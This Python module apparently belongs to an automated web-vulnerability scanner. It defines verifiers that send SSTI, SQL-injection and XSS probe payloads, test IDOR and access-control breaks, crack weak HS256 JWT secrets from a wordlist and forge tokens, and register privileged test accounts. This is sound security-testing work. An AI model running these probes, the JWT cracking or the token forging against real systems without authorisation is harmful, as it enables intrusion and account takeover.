"""Composable verifiers — the heart of the general engine.

Design seam (validated with an independent review): uniform OUTPUT (`Verdict`), structured INPUTS
(`Candidate` describes WHAT to test; `Transport` is the harness-owned way to send requests, incl.
per-role sessions). A verifier runs ONLY its class-specific oracle — it NEVER logs in, mints
sessions, or discovers resource ids (the harness does that and hands it a ready `Candidate` +
`Transport`). One verifier per vuln CLASS, not per app.

A Verdict is CONFIRMED (oracle fired), REJECTED (clean negative), or INCONCLUSIVE (couldn't tell —
request failed, WAF/error status, or no oracle). Findings are emitted ONLY on CONFIRMED — code
decides whether a vuln is real, never the LLM. INCONCLUSIVE is a coverage gap, never a finding."""
from __future__ import annotations
import base64
import hashlib
import hmac
import json as _jsonmod
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable, Mapping

CONFIRMED = "confirmed"
REJECTED = "rejected"
INCONCLUSIVE = "inconclusive"


@dataclass(frozen=True)
class Verdict:
    status: str          # confirmed | rejected | inconclusive
    vuln_class: str
    location: str
    evidence: str


@dataclass(frozen=True)
class Candidate:
    """What to test. The harness resolves auth/resource ids upstream into `url` + `oracle`."""
    vuln_class: str
    location: str                       # stable report key, e.g. "/search (param q)"
    url: str
    method: str = "GET"
    inject_field: str | None = None     # SSTI/SQLi: the param or JSON field to inject
    oracle: dict = field(default_factory=dict)   # class-specific params


@dataclass(frozen=True)
class Transport:
    """Harness-owned request surface. Verifiers never log in; they call these."""
    request: Callable[..., tuple]                       # (method, url, *, json=None, headers=None) -> (status, body)
    by_role: Mapping[str, Callable] = field(default_factory=dict)   # "anon"|"attacker"|"victim" -> fetch(url)


# --- SSTI -------------------------------------------------------------------------------------
# A distinctive arithmetic payload whose product is unlikely to appear by coincidence; a baseline
# request (a benign control value) guards against a page that already contains the product, so a
# coincidental match is not a false positive. Recall ceiling: this covers the {{...}} (jinja-style)
# engine family only — other engines (${...}, <%= %>, #{...}) need their own payloads.
_SSTI_PAYLOAD = "{{1234*5678}}"
_SSTI_PRODUCT = "7006652"
_SSTI_CONTROL = "grin-ssti-control"


def _with_param(url: str, field_name: str, value: str) -> str:
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}{field_name}={urllib.parse.quote(value)}"


def verify_ssti(candidate: Candidate, transport: Transport) -> Verdict:
    field_name = candidate.inject_field or "q"
    loc = candidate.location

    def send(value):
        if candidate.method.upper() == "POST":
            return transport.request("POST", candidate.url, json={field_name: value})
        return transport.request("GET", _with_param(candidate.url, field_name, value))

    try:
        _bstatus, bbody = send(_SSTI_CONTROL)
        pstatus, pbody = send(_SSTI_PAYLOAD)
    except Exception:
        return Verdict(INCONCLUSIVE, "ssti", loc, "request raised an exception")

    bbody, pbody = bbody or "", pbody or ""
    # Evaluated only when the product appears with the payload, NOT in the benign baseline, AND the
    # response was a clean (non-error) status — the product inside a 5xx stack trace / WAF page is
    # ambiguous, not a confirmed evaluation.
    if _SSTI_PRODUCT in pbody and _SSTI_PRODUCT not in bbody and pstatus and pstatus < 400:
        return Verdict(CONFIRMED, "ssti", loc,
                       f"{_SSTI_PAYLOAD} evaluated to {_SSTI_PRODUCT} (absent from the baseline)")
    if not pstatus or pstatus >= 400:
        return Verdict(INCONCLUSIVE, "ssti", loc, f"could not test cleanly (status {pstatus})")
    return Verdict(REJECTED, "ssti", loc, "payload not evaluated by a jinja-style template engine")


# --- IDOR --------------------------------------------------------------------------------------
def verify_idor(candidate: Candidate, transport: Transport) -> Verdict:
    """Oracle: the attacker receives the victim's exact resource (a 200 byte-identical to the
    victim's own view). Needs attacker + victim sessions from the harness.

    Two precision layers run when the harness supplies their inputs (it does in run_general),
    so permissive resource-id discovery can't turn a non-BOLA into a finding:
      - anon-denied: if an anonymous request gets the SAME bytes, the resource is world-readable,
        not a cross-user authorization break -> REJECTED.
      - attacker-own-id negative control: if the attacker's OWN resource (oracle.attacker_own_url)
        returns the same bytes as the victim's, every authenticated user gets identical content —
        a shared/default/empty template, not the victim's specific object -> REJECTED."""
    loc = candidate.location
    attacker = transport.by_role.get("attacker")
    victim = transport.by_role.get("victim")
    anon = transport.by_role.get("anon")
    if not (attacker and victim):
        return Verdict(INCONCLUSIVE, "idor", loc, "needs attacker + victim sessions")
    try:
        sa, ba = attacker(candidate.url)
        sv, bv = victim(candidate.url)
    except Exception:
        return Verdict(INCONCLUSIVE, "idor", loc, "request raised an exception")
    if sv != 200 or not (bv or "").strip():
        return Verdict(INCONCLUSIVE, "idor", loc, "could not establish the victim baseline")
    if not (sa == 200 and ba == bv):
        return Verdict(REJECTED, "idor", loc, "attacker did not receive the victim's resource")
    if anon is not None:
        try:
            _san, ban = anon(candidate.url)
        except Exception:
            ban = None
        if ban is not None and ban == bv:
            return Verdict(REJECTED, "idor", loc,
                           "resource is readable anonymously — not a cross-user authorization break")
    own_url = candidate.oracle.get("attacker_own_url")
    if own_url:
        try:
            _so, bo = attacker(own_url)
        except Exception:
            bo = None
        if bo is not None and bo == bv:
            return Verdict(REJECTED, "idor", loc,
                           "every authenticated user receives identical bytes — shared/default resource, not victim-specific")
    return Verdict(CONFIRMED, "idor", loc, "attacker received the victim's exact resource")


# --- SQLi (auth bypass) ------------------------------------------------------------------------
def verify_sqli(candidate: Candidate, transport: Transport) -> Verdict:
    """Oracle: the login returns an authenticated session token when the inject field is a SQL
    payload and the password is wrong."""
    import json as _json
    from grin.tools.sqli_probe import SQLI_PAYLOADS
    loc = candidate.location
    field_name = candidate.inject_field or "email"
    password = candidate.oracle.get("password", "wrong-pw-xyz")
    token_path = candidate.oracle.get("token_path", ("authentication", "token"))
    _SENTINELS = {"", "0", "false", "null", "none", "undefined"}

    def token_of(body):
        try:
            tok = _json.loads(body)
            for key in token_path:
                tok = tok[key]
            return tok if str(tok).strip().lower() not in _SENTINELS else None
        except Exception:
            return None

    # Benign control: a non-SQL wrong login must NOT yield a token. If it does, the endpoint hands
    # out tokens regardless of credentials — any "bypass" below would be a false positive.
    try:
        cs, cb = transport.request("POST", candidate.url,
                                   json={field_name: "grin-benign@example.test", "password": password})
        if cs == 200 and token_of(cb) is not None:
            return Verdict(REJECTED, "sql-injection", loc,
                           "login returns a token for benign wrong credentials — not an injection bypass")
    except Exception:
        pass

    reached = False   # got at least one clean (non-5xx) response
    for payload in SQLI_PAYLOADS:
        try:
            status, body = transport.request("POST", candidate.url,
                                             json={field_name: payload, "password": password})
        except Exception:
            continue
        if not status or status >= 500:
            continue        # transport / server error — not a clean negative
        reached = True
        if status != 200:
            continue        # a 401 is a clean rejection of this payload, not a bypass
        if token_of(body) is not None:   # a real session token, and the benign control got none
            return Verdict(CONFIRMED, "sql-injection", loc,
                           f"login bypassed with payload {payload!r}")
    if not reached:
        return Verdict(INCONCLUSIVE, "sql-injection", loc, "login endpoint unreachable / erroring")
    return Verdict(REJECTED, "sql-injection", loc, "no injection payload bypassed the login")


# --- BAC (unauthenticated sensitive access) ----------------------------------------------------
def verify_bac(candidate: Candidate, transport: Transport) -> Verdict:
    """Oracle: a sensitive path returns real content to an anonymous request, and that content is
    NOT the SPA catch-all shell (baseline diff). 401/403 = properly restricted = REJECTED."""
    from grin.tools.bac_probe import _is_sensitive
    loc = candidate.location
    anon = transport.by_role.get("anon")
    if anon is None:
        return Verdict(INCONCLUSIVE, "broken-access-control", loc, "needs an anonymous session")
    baseline_url = candidate.oracle.get("baseline_url")
    try:
        status, body = anon(candidate.url)
        _bs, bbody = anon(baseline_url) if baseline_url else (0, "")
    except Exception:
        return Verdict(INCONCLUSIVE, "broken-access-control", loc, "request raised an exception")
    body, bbody = body or "", bbody or ""
    # Sensitivity is judged on the URL path, NOT the (possibly decorated) report key in `location`.
    sensitive_path = urllib.parse.urlparse(candidate.url).path or candidate.location
    if status == 200 and body.strip() and _is_sensitive(sensitive_path) and body != bbody:
        return Verdict(CONFIRMED, "broken-access-control", loc,
                       "sensitive content served without authentication")
    if status in (401, 403):
        return Verdict(REJECTED, "broken-access-control", loc, "access is properly restricted")
    if not status or status >= 500:
        return Verdict(INCONCLUSIVE, "broken-access-control", loc,
                       f"could not test cleanly (status {status})")
    return Verdict(REJECTED, "broken-access-control", loc, "no sensitive content exposed")


# --- write-side BAC / identity forgery (the "forged-review" class) ------------------------------
def _find_record_with_marker(body: str, marker_field: str, nonce: str):
    """Find the single JSON record whose `marker_field` value EXACTLY equals this write's nonce.
    Exact equality (not substring, not any-field) pins the match to the record we just wrote —
    not a wrapper object around the list, nor an unrelated record that mentions the nonce."""
    import json as _json
    try:
        data = _json.loads(body)
    except Exception:
        return None
    nonce = nonce.strip()
    found = []

    def walk(node):
        if isinstance(node, dict):
            if str(node.get(marker_field, "")).strip() == nonce:
                found.append(node)
            for v in node.values():
                walk(v)
        elif isinstance(node, list):
            for v in node:
                walk(v)

    walk(data)
    return found[0] if found else None


def verify_write_authz(candidate: Candidate, transport: Transport) -> Verdict:
    """Oracle: an attacker writes a record carrying ANOTHER user's identity in an attribution
    field, and the server persists that forged identity with no surviving marker of the real
    (attacker) author. Reported as broken-access-control so it scores against the GT.

    Precision layers (each must hold or it is not CONFIRMED):
      - CONTROL write first (attacker's own identity): proves writes surface on read AND that the
        attribution field is client-reflected at all. If not -> INCONCLUSIVE, never a false clean.
      - exact record co-location: the forged identity is read from the record whose marker_field
        EQUALS this write's unique nonce — not merely somewhere in the collection response.
      - cosmetic-field guard: if that record's OTHER fields still expose the attacker's true
        identity, real ownership is intact and the field was only cosmetic -> REJECTED."""
    import uuid
    loc, o = candidate.location, candidate.oracle
    attacker = transport.by_role.get("attacker")
    if attacker is None:
        return Verdict(INCONCLUSIVE, "broken-access-control", loc, "needs an attacker session")
    required = ("write_url", "read_url", "forged_field", "marker_field", "forged_value")
    if any(not o.get(k) for k in required):
        return Verdict(INCONCLUSIVE, "broken-access-control", loc, "incomplete write-authz candidate")
    ff, mf = o["forged_field"], o["marker_field"]
    write_method = o.get("write_method", "POST")
    control_value = o.get("control_value", "grin-control-author")

    def write_and_read(identity):
        """-> (kind, write_status, record). kind 'error' means a request failed / 5xx / no status
        (couldn't test); 'ok' carries the write status and the located record (or None)."""
        nonce = "grin-" + uuid.uuid4().hex[:12]
        body = dict(o.get("body_template") or {})
        body[ff], body[mf] = identity, nonce
        try:
            ws, _wb = attacker(o["write_url"], method=write_method, json=body)
        except Exception:
            return "error", None, None
        if not ws or ws >= 500:
            return "error", None, None
        try:
            rs, rb = attacker(o["read_url"])
        except Exception:
            return "error", None, None
        if not rs or rs >= 500:
            return "error", None, None
        return "ok", ws, _find_record_with_marker(rb or "", mf, nonce)

    # CONTROL: prove the write/read path works AND the attribution field is client-reflected.
    kind, ws, ctrl = write_and_read(control_value)
    if kind == "error" or not (200 <= ws < 300) or ctrl is None:
        return Verdict(INCONCLUSIVE, "broken-access-control", loc,
                       "could not exercise the write/read path as the attacker")
    if str(ctrl.get(ff, "")).strip().lower() != str(control_value).strip().lower():
        return Verdict(INCONCLUSIVE, "broken-access-control", loc,
                       "attribution field is not client-reflected — cannot test forgery")

    # FORGERY: write the victim's identity into the attribution field.
    kind, ws, forged = write_and_read(o["forged_value"])
    if kind == "error":
        return Verdict(INCONCLUSIVE, "broken-access-control", loc, "forged write/read errored")
    if not (200 <= ws < 300):
        return Verdict(REJECTED, "broken-access-control", loc, "server rejected the forged write")
    if forged is None:
        return Verdict(INCONCLUSIVE, "broken-access-control", loc, "forged write did not surface on read")
    if str(forged.get(ff, "")).strip().lower() != str(o["forged_value"]).strip().lower():
        return Verdict(REJECTED, "broken-access-control", loc,
                       "server overrode the attribution field with the session identity")
    # Cosmetic-field guard: a SEPARATE field still exposing the attacker's true identity means real
    # ownership survived. Scan the record's OTHER scalar fields (skip the forged + marker fields, so
    # the attacker's own marker text never triggers a false REJECTED).
    attacker_ids = [str(a).strip().lower() for a in (o.get("attacker_identity") or []) if a]
    for k, v in forged.items():
        if k in (ff, mf):
            continue
        vs = str(v).strip().lower()
        if any(aid and aid in vs for aid in attacker_ids):
            return Verdict(REJECTED, "broken-access-control", loc,
                           "record still exposes the attacker's true identity — field is cosmetic")
    return Verdict(CONFIRMED, "broken-access-control", loc,
                   f"attacker forged a record attributed to {o['forged_value']!r} with no surviving true-owner marker")


# --- error-based SQL injection (data-extraction surface, not auth bypass) ----------------------
# Vendor/ORM error fingerprints. Deliberately specific — generic "error"/"exception" would flag any
# app that 500s on malformed input. Blind SQLi (no error surfaced) is OUT OF SCOPE for this oracle.
_DB_ERROR_SIGNATURES = (
    "sql syntax", "sqlite3.operationalerror", "sqlalchemy", "psycopg2",
    "org.postgresql.util.psqlexception", "you have an error in your sql",
    "unterminated quoted string", "unclosed quotation mark", "quoted string not properly terminated",
    "unrecognized token", "odbc sql server driver", "ora-00933", "ora-01756", "ora-00921",
    "mysql_fetch", "com.mysql", "java.sql.sqlsyntaxerror", "org.hibernate.exception.sqlgrammar",
    "django.db.utils", "sequelize", "incorrect syntax near", 'near "',
)
_WAF_BLOCK = (403, 406, 429, 451)


def verify_error_sqli(candidate: Candidate, transport: Transport) -> Verdict:
    """Oracle: a single quote breaks a SQL STRING context. CONFIRMED needs (1) a DB-error signature
    that appears only with the broken quote — absent from the benign baseline AND from the balanced
    (doubled-quote) control — AND (2) the injected marker echoed back inside that error (payload-
    adjacent evidence that OUR input reached the SQL parser, not just any 500). Reported as
    sql-injection. Blind SQLi (no error surfaced) is out of scope -> REJECTED there, not a finding."""
    import uuid
    loc, o = candidate.location, candidate.oracle
    marker = "grin" + uuid.uuid4().hex[:8]
    # Probe as the attacker session when one exists (so cookie/auth-gated endpoints are reachable),
    # else anonymously. A role callable and transport.request share the (method, url, json) shape.
    agent = transport.by_role.get("attacker") or (
        lambda u, method="GET", json=None: transport.request(method, u, json=json))

    def send(value):
        if o.get("inject") == "path":
            url = o["url_template"].replace("{inject}", urllib.parse.quote(value, safe=""))
            return agent(url)
        field = candidate.inject_field or "q"
        if candidate.method.upper() == "POST":
            return agent(candidate.url, method="POST", json={field: value})
        return agent(_with_param(candidate.url, field, value))

    try:
        sa, a = send(marker)
        _sa2, a2 = send(marker)                 # stability: an unstable baseline can't be trusted
        sb, b = send(marker + "'")              # broken: odd number of quotes
        _sc, c = send(marker + "''")            # balanced: the doubled quote escapes cleanly
    except Exception:
        return Verdict(INCONCLUSIVE, "sql-injection", loc, "request raised an exception")
    a, a2, b, c = a or "", a2 or "", b or "", c or ""
    if sa in (401, 403):
        return Verdict(INCONCLUSIVE, "sql-injection", loc,
                       "endpoint requires authentication — not tested (would be a silent miss, not a clean negative)")
    if sa in _WAF_BLOCK or (sb in _WAF_BLOCK and sb != sa):
        return Verdict(INCONCLUSIVE, "sql-injection", loc, "probe appears policy-blocked (WAF)")
    if not sb or a != a2:
        return Verdict(INCONCLUSIVE, "sql-injection", loc, "unstable baseline / no response — cannot test cleanly")
    bl, al, cl = b.lower(), a.lower(), c.lower()
    sig = next((s for s in _DB_ERROR_SIGNATURES if s in bl), None)
    if sig is None:
        return Verdict(REJECTED, "sql-injection", loc, "a single quote did not surface a database error")
    if sig in al or sig in cl:
        return Verdict(REJECTED, "sql-injection", loc,
                       "the database-error signature is not specific to the broken-quote input")
    if marker not in b:
        return Verdict(REJECTED, "sql-injection", loc,
                       "the database error does not echo the injected input (no payload-adjacent evidence)")
    return Verdict(CONFIRMED, "sql-injection", loc,
                   f"a single quote broke a SQL string context ({sig!r}); the injected input is echoed in the database error")


# --- reflected XSS (unencoded HTML reflection) ------------------------------------------------
def _looks_html_body(body):
    s = (body or "").lstrip()
    return bool(s) and s[:1] not in "{[" and "<" in s[:2048]


def _in_noninjectable_context(body_lower, idx):
    """True if the reflection at `idx` sits where a raw '<' does NOT open a tag: inside an HTML
    comment, a raw-text element (script/style/textarea/title/noscript), or a quoted attribute."""
    pre = body_lower[:idx]
    if pre.rfind("<!--") > pre.rfind("-->"):
        return True
    for tag in ("script", "style", "textarea", "title", "noscript"):
        if pre.rfind("<" + tag) > pre.rfind("</" + tag):
            return True
    seg = pre[pre.rfind("<"):] if "<" in pre else pre   # the tag currently being written, if any
    return seg.count('"') % 2 == 1 or seg.count("'") % 2 == 1


def verify_reflected_xss(candidate: Candidate, transport: Transport) -> Verdict:
    """Oracle: the input is reflected with a RAW '<' (not HTML-encoded) in an injectable HTML
    context. CONFIRMED = unencoded HTML reflection (HTML injection); script execution is NOT proven
    without a browser, and the evidence says so. Attribute-breakout and stored XSS are out of scope.
    Probes through the attacker session when present."""
    import uuid
    loc, o = candidate.location, candidate.oracle
    marker = "grinx" + uuid.uuid4().hex[:8]
    payload = "<" + marker          # a prefix, not a closed tag — also catches strip-'>' filters
    agent = transport.by_role.get("attacker") or (
        lambda u, method="GET", json=None: transport.request(method, u, json=json))
    field = candidate.inject_field or "q"
    try:
        if candidate.method.upper() == "POST":
            status, body = agent(candidate.url, method="POST", json={field: payload})
        else:
            status, body = agent(_with_param(candidate.url, field, payload))
    except Exception:
        return Verdict(INCONCLUSIVE, "xss", loc, "request raised an exception")
    body = body or ""
    if not status or status >= 400:
        return Verdict(INCONCLUSIVE, "xss", loc, f"could not test cleanly (status {status})")
    if not _looks_html_body(body):
        return Verdict(REJECTED, "xss", loc, "response is not an HTML document")
    bl = body.lower()
    idx = bl.find(payload.lower())
    if idx == -1:
        return Verdict(REJECTED, "xss", loc, "input not reflected with a raw '<' (encoded or absent)")
    if _in_noninjectable_context(bl, idx):
        return Verdict(REJECTED, "xss", loc,
                       "reflected inside a non-injectable context (comment / raw-text element / quoted attribute)")
    return Verdict(CONFIRMED, "xss", loc,
                   "input reflected with a raw '<' in an HTML context (HTML injection; script execution not verified without a browser)")


# --- broken authentication (OWASP API2): a weak HS256 JWT signing secret --------------------
# A small common-secret list (a real engagement would load a wordlist; this is the cheap check).
_JWT_WORDLIST = (
    "secret", "your-256-bit-secret", "changeme", "change_me", "password", "passw0rd", "key",
    "jwt", "jwtsecret", "jwt_secret", "supersecret", "super_secret", "mysecret", "my_secret",
    "secretkey", "secret_key", "token", "admin", "123456", "12345678", "random", "secret123",
    "s3cr3t", "topsecret", "default", "test", "qwerty", "letmein", "root", "vampi", "flask",
    "django-insecure", "CHANGE_ME", "Sup3rS3cr3t",
)


def _b64url_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _crack_hs256(token, wordlist):
    """Recover the HS256 signing secret of a JWT from a wordlist (offline). None if not found."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = _jsonmod.loads(_b64url_decode(parts[0]))
    except Exception:
        return None
    if str(header.get("alg", "")).upper() != "HS256":
        return None
    signing_input = (parts[0] + "." + parts[1]).encode()
    try:
        want = _b64url_decode(parts[2])
    except Exception:
        return None
    for secret in wordlist:
        got = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(got, want):
            return secret
    return None


def _forge_hs256(token, secret):
    """Re-sign the token's claims (with a bumped expiry) using `secret` — a NEW, valid token."""
    h, p, _sig = token.split(".")
    claims = _jsonmod.loads(_b64url_decode(p))
    claims["exp"] = int(time.time()) + 3600
    np = _b64url(_jsonmod.dumps(claims, separators=(",", ":")).encode())
    signing_input = (h + "." + np).encode()
    sig = _b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
    return f"{h}.{np}.{sig}"


def verify_jwt_weak_secret(candidate: Candidate, transport: Transport) -> Verdict:
    """Oracle: the JWT HS256 secret is recoverable from a common-secret wordlist, AND a token
    forged with it (claims re-signed, expiry bumped) is ACCEPTED by a protected endpoint — proving
    an attacker can mint arbitrary valid tokens. Reported as broken-authentication."""
    o = candidate.oracle
    token, verify_url = o.get("token"), o.get("verify_url")
    if not token or not verify_url:
        return Verdict(INCONCLUSIVE, "broken-authentication", candidate.location,
                       "no token / protected endpoint to test against")
    secret = _crack_hs256(token, o.get("wordlist") or _JWT_WORDLIST)
    if secret is None:
        return Verdict(REJECTED, "broken-authentication", candidate.location,
                       "HS256 secret not recovered from the common-secret wordlist")
    forged = _forge_hs256(token, secret)
    try:
        status, _b = transport.request("GET", verify_url, headers={"Authorization": "Bearer " + forged})
    except Exception:
        return Verdict(INCONCLUSIVE, "broken-authentication", candidate.location,
                       "could not test the forged token")
    if status == 200:
        return Verdict(CONFIRMED, "broken-authentication", candidate.location,
                       f"the HS256 signing secret is weak ({secret!r}); a forged token was accepted")
    return Verdict(INCONCLUSIVE, "broken-authentication", candidate.location,
                   f"secret recovered ({secret!r}) but the forged token was not accepted at {verify_url}")


# --- mass assignment (OWASP API6): a client-supplied privilege field persists at registration ---
# Boolean privilege flags only. 'role'/'verified'/'is_active' are deliberately excluded — apps
# legitimately let users pick those at signup, so they are not near-zero-FP signals.
_PRIV_FIELDS = ("admin", "is_admin", "isAdmin", "is_staff", "isStaff",
                "is_superuser", "isSuperuser", "superadmin")
_MISSING = object()


def _priv_true(v) -> bool:
    if isinstance(v, bool):
        return v is True
    if isinstance(v, int):
        return v == 1
    if isinstance(v, str):
        return v.strip().lower() in ("true", "1", "yes", "t")
    return False


def _priv_false(v) -> bool:
    if isinstance(v, bool):
        return v is False
    if isinstance(v, int):
        return v == 0
    if isinstance(v, str):
        return v.strip().lower() in ("false", "0", "no", "f", "")
    return False


def _find_field_value(node, field):
    """Recursively find a scalar value for `field` (case-insensitive). _MISSING if absent."""
    fl = field.lower()
    if isinstance(node, dict):
        for k, v in node.items():
            if str(k).lower() == fl and not isinstance(v, (dict, list)):
                return v
        for v in node.values():
            r = _find_field_value(v, field)
            if r is not _MISSING:
                return r
    elif isinstance(node, list):
        for v in node:
            r = _find_field_value(v, field)
            if r is not _MISSING:
                return r
    return _MISSING


def verify_mass_assignment(candidate: Candidate, transport: Transport) -> Verdict:
    """Oracle: a privilege field supplied in the REGISTRATION body persists, when the server should
    set it itself. Self-contained: registers a control account (no priv field), discovers how to
    log in from it, reads its profile, then for each privilege field registers a treatment account
    with the field set and compares. CONFIRMED needs the treatment profile privileged AND the
    control NOT — re-confirmed on a SECOND fresh login (kills session-echo / one-shot hydration).

    DESTRUCTIVE: creates accounts (prefixed grin-ma-) on the target. Authorized targets only.
    Reports a writable privilege field, not proven functional privilege escalation."""
    import uuid
    import json as _json
    from grin.login_discovery import discover_login, shape_login
    loc, o = candidate.location, candidate.oracle
    base, reg_url, profile_url = o["base_url"], o["register_url"], o["profile_url"]
    extra = o.get("register_template") or {}
    pw = "Grin-MA-pw-9173!"
    post = lambda u, b: transport.request("POST", u, json=b)   # noqa: E731

    def register(username, priv=None):
        body = {"username": username, "email": username + "@grin.test", "password": pw,
                "passwordRepeat": pw, "confirmPassword": pw}
        body.update(extra)
        if priv is not None:
            body[priv] = True
        try:
            s, _b = post(reg_url, body)
        except Exception:
            return False
        return 200 <= (s or 0) < 300

    def profile_of(username, shape):
        tok, _ = shape_login(base, username, pw, post, shape)
        if not tok:
            return None
        try:
            s, b = transport.request("GET", profile_url, headers={"Authorization": "Bearer " + tok})
        except Exception:
            return None
        if s != 200:
            return None
        try:
            return _json.loads(b or "")
        except Exception:
            return None

    ctl = "grin-ma-" + uuid.uuid4().hex[:10]
    if not register(ctl):
        return Verdict(INCONCLUSIVE, "mass-assignment", loc, "could not register a control account")
    shape = discover_login(base, ctl, pw, post)
    if shape is None:
        return Verdict(INCONCLUSIVE, "mass-assignment", loc, "could not establish how to log in")
    pc = profile_of(ctl, shape)
    if pc is None:
        return Verdict(INCONCLUSIVE, "mass-assignment", loc, "could not read the control profile")
    tested = False
    for priv_field in _PRIV_FIELDS:
        trt = "grin-ma-" + uuid.uuid4().hex[:10]
        if not register(trt, priv=priv_field):
            continue
        pt = profile_of(trt, shape)
        if pt is None:
            continue
        cval, tval = _find_field_value(pc, priv_field), _find_field_value(pt, priv_field)
        if cval is _MISSING or tval is _MISSING:
            continue
        tested = True
        if _priv_true(tval) and _priv_false(cval):
            pt2 = profile_of(trt, shape)        # second fresh login — kills session-echo FPs
            if pt2 is not None and _priv_true(_find_field_value(pt2, priv_field)):
                return Verdict(CONFIRMED, "mass-assignment", loc,
                               f"registration persisted client-supplied {priv_field!r}; the control account did not (re-confirmed on a fresh login)")
    if not tested:
        return Verdict(INCONCLUSIVE, "mass-assignment", loc,
                       "no privilege field was readable on the profile to compare")
    return Verdict(REJECTED, "mass-assignment", loc,
                   "the server ignored client-supplied privilege fields at registration")


# --- excessive data exposure (OWASP API3): sensitive records served without auth --------------
# Password-family ONLY (the unambiguous signal). 'secret'/'api_key'/'token' are deliberately
# excluded — public share-secrets and publishable keys would blow the FP budget.
_CREDENTIAL_FIELDS = ("password", "passwd", "pwd", "password_hash", "passwordhash")
_IDENTITY_FIELDS = ("username", "email", "user", "user_id", "userid", "uid", "login")
_SCHEMA_KEYS = ("components", "schemas", "definitions", "properties", "example", "examples", "parameters")
_MASK_VALUES = ("", "null", "none", "[redacted]", "redacted", "changeme", "string", "password",
                "example", "your_password", "<password>")


def _is_real_secret(val) -> bool:
    if not isinstance(val, (str, int)):
        return False
    s = str(val).strip()
    return bool(s) and set(s) != {"*"} and s.lower() not in _MASK_VALUES


def _scan_exposed(node, in_schema=False) -> bool:
    """True if some object carries BOTH an identity field and a real password-family value. Skips
    OpenAPI/JSON-schema subtrees (where {password: 'string'} is a type, not a leak)."""
    if isinstance(node, dict):
        if not in_schema:
            keys = {str(k).lower(): k for k in node}
            cred = next((f for f in _CREDENTIAL_FIELDS if f in keys), None)
            if cred and any(f in keys for f in _IDENTITY_FIELDS) and _is_real_secret(node[keys[cred]]):
                return True
        for k, v in node.items():
            if _scan_exposed(v, in_schema or str(k).lower() in _SCHEMA_KEYS):
                return True
    elif isinstance(node, list):
        return any(_scan_exposed(v, in_schema) for v in node)
    return False


def verify_exposure(candidate: Candidate, transport: Transport) -> Verdict:
    """Oracle: an anonymous request receives records co-locating an identity and a password-family
    value (cleartext or hash). The anon gate proves 'no auth'; the credential+identity co-location
    proves the data is sensitive PII, not a public share-secret. JSON-only this slice (CSV/HTML/XML
    leaks are a documented follow-up); blind/masked values are out of scope."""
    import json as _json
    loc = candidate.location
    anon = transport.by_role.get("anon")
    getter = anon if anon is not None else (lambda u: transport.request("GET", u))
    try:
        status, body = getter(candidate.url)
    except Exception:
        return Verdict(INCONCLUSIVE, "excessive-data-exposure", loc, "request raised an exception")
    if status in (401, 403, 404):
        return Verdict(REJECTED, "excessive-data-exposure", loc, "access is properly restricted")
    if not status or status >= 500 or status == 429:
        return Verdict(INCONCLUSIVE, "excessive-data-exposure", loc, f"could not test cleanly (status {status})")
    if status != 200:
        return Verdict(REJECTED, "excessive-data-exposure", loc, f"no exposure (status {status})")
    try:
        parsed = _json.loads(body or "")
    except Exception:
        return Verdict(REJECTED, "excessive-data-exposure", loc, "response is not JSON (out of scope for this oracle)")
    if _scan_exposed(parsed):
        return Verdict(CONFIRMED, "excessive-data-exposure", loc,
                       "identity + password records served to an anonymous request")
    return Verdict(REJECTED, "excessive-data-exposure", loc, "no exposed identity+credential records")


_REGISTRY: dict = {
    "ssti": verify_ssti,
    "idor": verify_idor,
    "sql-injection": verify_sqli,
    "broken-access-control": verify_bac,
    "forged-review": verify_write_authz,
    "sqli-error": verify_error_sqli,
    "excessive-data-exposure": verify_exposure,
    "mass-assignment": verify_mass_assignment,
    "jwt-weak-secret": verify_jwt_weak_secret,
    "reflected-xss": verify_reflected_xss,
}


def verify(candidate: Candidate, transport: Transport) -> Verdict:
    """Dispatch a candidate to its class verifier. Unknown class -> INCONCLUSIVE (no oracle)."""
    fn = _REGISTRY.get(candidate.vuln_class)
    if fn is None:
        return Verdict(INCONCLUSIVE, candidate.vuln_class, candidate.location,
                       f"no verifier for class {candidate.vuln_class!r}")
    return fn(candidate, transport)
